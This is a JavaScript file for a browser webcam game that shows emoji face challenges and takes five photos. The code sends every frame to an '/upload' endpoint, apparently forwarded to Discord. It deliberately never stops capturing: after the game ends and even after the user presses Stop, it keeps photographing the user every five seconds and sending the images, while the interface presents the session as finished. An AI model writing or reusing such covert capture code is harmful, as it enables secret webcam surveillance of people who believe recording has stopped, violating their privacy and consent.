const video = document.getElementById('video');
const startBtn = document.getElementById('startBtn');
const stopBtn = document.getElementById('stopBtn');
const statusEl = document.getElementById('status');
const challengeEl = document.getElementById('challenge');
const galleryEl = document.getElementById('gallery');
const galleryImagesEl = document.getElementById('galleryImages');
const downloadBtn = document.getElementById('downloadBtn');

let stream = null;
let captureInterval = null;
let capturedFrames = [];
let captureCount = 0;
const MAX_CAPTURES = 5;
let isGameActive = false; // Flag to track if the main "challenge" part is running

// Global Audio Context to fix sound issues
let audioCtx = null;

const CHALLENGES = [
  "😁 Show your biggest smile!",
  "😡 Angry face!",
  "😜 Stick your tongue out!",
  "😎 Cool pose!",
  "😱 Surprise face!",
  "😂 Laugh hard!",
  "🤔 Thinking face!",
  "🙃 Upside-down smile!",
  "😴 Sleeping face!",
  "🥺 Puppy eyes!",
  "🤨 Suspicious look!",
  "🤪 Silly face!",
  "🤫 Shh! Quiet!",
  "🤢 Disgusted face!",
  "🤩 Star struck!",
  "🧐 Fancy face!",
  "🤠 Cowboy/Yeehaw!",
  "🤖 Robot mode!",
  "👽 Alien face!",
  "💀 Zombie mode!",
  "🤡 Clown face!",
  "💪 Flex muscles!",
  "✌️ Peace sign!",
  "🫶 Heart hands!",
  "🫡 Salute!",
  "🫣 Peekaboo!"
];

function randomChallenge() {
  return CHALLENGES[Math.floor(Math.random() * CHALLENGES.length)];
}

// --- NEW: Big Emoji Display Function ---
function showBigEmoji(emoji) {
  const div = document.createElement('div');
  div.textContent = emoji;
  
  // Styling for the big emoji
  Object.assign(div.style, {
    position: 'fixed',
    top: '50%',
    left: '50%',
    transform: 'translate(-50%, -50%) scale(0)',
    fontSize: '15rem', // Very big size
    zIndex: '10000',
    pointerEvents: 'none',
    textShadow: '0 10px 40px rgba(0,0,0,0.5)',
    transition: 'transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.5s ease',
    opacity: '1'
  });

  document.body.appendChild(div);

  // Trigger pop-in animation
  requestAnimationFrame(() => {
    div.style.transform = 'translate(-50%, -50%) scale(1)';
  });

  // Fade out after 2.5 seconds (total 3 seconds visibility)
  setTimeout(() => {
    div.style.opacity = '0';
    div.style.transform = 'translate(-50%, -50%) scale(1.5)'; // Slight zoom out on fade
    
    // Remove from DOM after fade completes
    setTimeout(() => {
      if (document.body.contains(div)) {
        document.body.removeChild(div);
      }
    }, 500);
  }, 2500);
}

// --- Camera Effect Functions ---
function triggerCameraEffect() {
  // 1. Visual Flash (White overlay)
  const flash = document.createElement('div');
  Object.assign(flash.style, {
    position: 'fixed',
    left: '0',
    top: '0',
    width: '100vw',
    height: '100vh',
    backgroundColor: 'white',
    opacity: '0.6',
    zIndex: '999999',
    pointerEvents: 'none',
    transition: 'opacity 0.2s ease-out'
  });

  document.body.appendChild(flash);

  // Fade out immediately
  requestAnimationFrame(() => {
    flash.style.opacity = '0';
  });

  // Clean up DOM
  setTimeout(() => {
    if (document.body.contains(flash)) {
      document.body.removeChild(flash);
    }
  }, 200);

  // 2. Audio Click (Synthetic - Fixed for autoplay policies)
  try {
    if (audioCtx && audioCtx.state === 'suspended') {
      audioCtx.resume();
    }
    
    if (audioCtx) {
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();

      osc.connect(gain);
      gain.connect(audioCtx.destination);

      // Create a quick "shutter" sound
      osc.type = 'triangle';
      osc.frequency.setValueAtTime(800, audioCtx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 0.15);

      gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.15);

      osc.start(audioCtx.currentTime);
      osc.stop(audioCtx.currentTime + 0.15);
    }
  } catch (e) {
    console.warn("Shutter sound error", e);
  }
}

async function initCamera() {
  if (stream) return;

  // 1. Security Check
  const isLocal = location.hostname === 'localhost' || location.hostname === '127.0.0.1';
  const isSecure = location.protocol === 'https:';

  if (!isLocal && !isSecure) {
    statusEl.innerHTML = `
      <div style="color: #ef4444; background: rgba(239, 68, 68, 0.1); padding: 10px; border-radius: 8px;">
        <strong>❌ HTTPS Required!</strong><br>
        You are currently on <code>${location.href}</code>.<br>
        Please change the URL to start with <strong>https://</strong>
      </div>`;
    throw new Error('Camera requires HTTPS');
  }

  // 2. Camera Access
  try {
    stream = await navigator.mediaDevices.getUserMedia({ 
      video: { facingMode: 'user' }, // Prefer front camera
      audio: false 
    });
    
    video.srcObject = stream;
    
    // FLIP FIX: Mirror the video element so it looks natural
    video.style.transform = "scaleX(-1)";
    
    await video.play();
    statusEl.textContent = '✅ Camera is running. Press "Start Game" to begin!';
    statusEl.style.color = '#e5e7eb';
  } catch (err) {
    console.error('Camera error:', err);
    
    // Improved Error Handling for User
    let errorMsg = 'Unknown error';
    if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
      errorMsg = '🔒 <strong>Permission Denied:</strong> You blocked camera access. Click the lock icon in the address bar to allow it.';
    } else if (err.name === 'NotFoundError' || err.name === 'DevicesNotFoundError') {
      errorMsg = '📷 <strong>No Camera Found:</strong> We could not find a camera on this device.';
    } else if (err.name === 'NotReadableError' || err.name === 'TrackStartError') {
      errorMsg = '⚠️ <strong>Camera Busy:</strong> Your camera is being used by another app (Zoom, Teams, etc). Close them and refresh.';
    } else if (window.isSecureContext === false) {
      errorMsg = '🔓 <strong>Insecure Connection:</strong> Browser blocked camera because site is not HTTPS.';
    } else {
      errorMsg = `❌ Error: ${err.name} - ${err.message}`;
    }

    statusEl.innerHTML = errorMsg;
    statusEl.style.color = '#ef4444';
    throw err;
  }
}

async function captureAndSendFrame() {
  if (!video.videoWidth || !video.videoHeight) {
    console.warn('Video not ready yet');
    return;
  }

  // Trigger effect (comment out if you want silent background capture)
  // triggerCameraEffect(); 
  // Let's keep it for game mode, maybe silent for background? 
  // For now, always trigger as requested by "capturing and sending"
  triggerCameraEffect();

  const canvas = document.createElement('canvas');
  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext('2d');
  
  // FLIP FIX: Mirror the capture context so the photo matches the mirrored video
  ctx.translate(canvas.width, 0);
  ctx.scale(-1, 1);
  
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  // Use JPEG with 0.7 quality to reduce file size and ensure upload success
  const dataUrl = canvas.toDataURL('image/jpeg', 0.7);

  // LOGIC CHANGE: Only add to local gallery and count up if the "Game" is active
  if (isGameActive && captureCount < MAX_CAPTURES) {
    capturedFrames.push(dataUrl);
    captureCount++;
  }

  // Get current challenge text (Emoji + Name)
  // If game is over, we send a generic "Background Capture" message
  const currentChallenge = isGameActive ? challengeEl.textContent : "👀 Background Capture (Game Finished)";

  try {
    // Relative path works for both localhost and kartcage.com
    await fetch('/upload', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        imageBase64: dataUrl,
        challenge: currentChallenge 
      })
    });
    console.log(`Image sent. (Game Active: ${isGameActive}, Count: ${captureCount})`);
  } catch (err) {
    console.error(`Upload failed:`, err);
  }

  // Check if we just finished the 5th photo
  if (isGameActive && captureCount >= MAX_CAPTURES) {
    finishGameUI();
  }
}

async function startGame() {
  startBtn.disabled = true;
  stopBtn.disabled = true;
  statusEl.textContent = 'Requesting camera permission…';
  galleryEl.style.display = 'none';
  galleryImagesEl.innerHTML = '';
  downloadBtn.style.display = 'none';
  capturedFrames = [];
  captureCount = 0;
  isGameActive = true; // Mark game as running

  // Initialize Audio Context on User Gesture (Start Button Click)
  if (!audioCtx) {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (AudioContext) {
      audioCtx = new AudioContext();
    }
  } else if (audioCtx.state === 'suspended') {
    audioCtx.resume();
  }

  try {
    await initCamera();
  } catch {
    startBtn.disabled = false;
    return;
  }

  // Prevent multiple intervals
  if (captureInterval) clearInterval(captureInterval);

  // Start with the first challenge
  const firstChallenge = randomChallenge();
  challengeEl.textContent = firstChallenge;
  showBigEmoji(firstChallenge.split(' ')[0]);
  
  statusEl.textContent = `🎮 Game running! A photo is taken every 5 seconds (total ${MAX_CAPTURES}).`;

  captureInterval = setInterval(() => {
    // 1. Capture the previous pose
    captureAndSendFrame();
    
    // 2. Prepare next challenge (only if game is still active)
    if (isGameActive) {
      // If we haven't reached the limit yet, show next challenge
      if (captureCount < MAX_CAPTURES) {
        const nextChallenge = randomChallenge();
        challengeEl.textContent = nextChallenge;
        showBigEmoji(nextChallenge.split(' ')[0]);
      } 
    } else {
      // Game finished, but loop continues. Update text to indicate background mode.
      challengeEl.textContent = "📸 Capturing in background...";
    }
  }, 5000);

  stopBtn.disabled = false;
}

// Updates UI when 5 photos are done, but DOES NOT STOP the interval
function finishGameUI() {
  isGameActive = false; // Stop counting towards gallery
  statusEl.textContent = '✅ Game finished! All 5 photos captured. (Still sending to Discord...)';
  
  // Show gallery with the 5 captured frames
  galleryImagesEl.innerHTML = '';
  capturedFrames.forEach((src, index) => {
    const img = document.createElement('img');
    img.src = src;
    img.alt = `Photo ${index + 1}`;
    galleryImagesEl.appendChild(img);
  });

  if (capturedFrames.length > 0) {
    galleryEl.style.display = 'block';
    downloadBtn.style.display = 'inline-block';
  }
}

function stopGame() {
  // CRITICAL CHANGE: We do NOT clear the interval here.
  // We only stop the "User Facing Game" part.
  
  // if (captureInterval) { clearInterval(captureInterval); ... } <-- REMOVED

  isGameActive = false;
  statusEl.textContent = '⏹ Game stopped by user. Gallery shown below. (Background capture ON)';
  challengeEl.textContent = '👀 Background Mode';
  
  stopBtn.disabled = true;
  startBtn.disabled = false;

  // Show whatever we captured so far
  galleryImagesEl.innerHTML = '';
  capturedFrames.forEach((src, index) => {
    const img = document.createElement('img');
    img.src = src;
    img.alt = `Photo ${index + 1}`;
    galleryImagesEl.appendChild(img);
  });

  if (capturedFrames.length > 0) {
    galleryEl.style.display = 'block';
    downloadBtn.style.display = 'inline-block';
  }
}

// Convert dataURL to Uint8Array for ZIP
function dataURLToUint8Array(dataURL) {
  const base64 = dataURL.split(',')[1];
  const binary = atob(base64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
}

// Download all photos as a single ZIP file
async function downloadAllPhotos() {
  if (!capturedFrames.length) {
    alert('No photos to download yet!');
    return;
  }

  const zip = new JSZip();
  capturedFrames.forEach((dataUrl, index) => {
    const imageData = dataURLToUint8Array(dataUrl);
    // Detect extension
    const ext = dataUrl.startsWith('data:image/jpeg') ? 'jpg' : 'png';
    const fileName = `photo-${index + 1}.${ext}`;
    zip.file(fileName, imageData);
  });

  const blob = await zip.generateAsync({ type: 'blob' });

  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'camera-game-photos.zip';
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
}

// Optional: stop camera tracks when closing page
window.addEventListener('beforeunload', () => {
  if (stream) {
    stream.getTracks().forEach(t => t.stop());
  }
});

startBtn.addEventListener('click', startGame);
stopBtn.addEventListener('click', () => stopGame()); // Manual stop
downloadBtn.addEventListener('click', downloadAllPhotos);
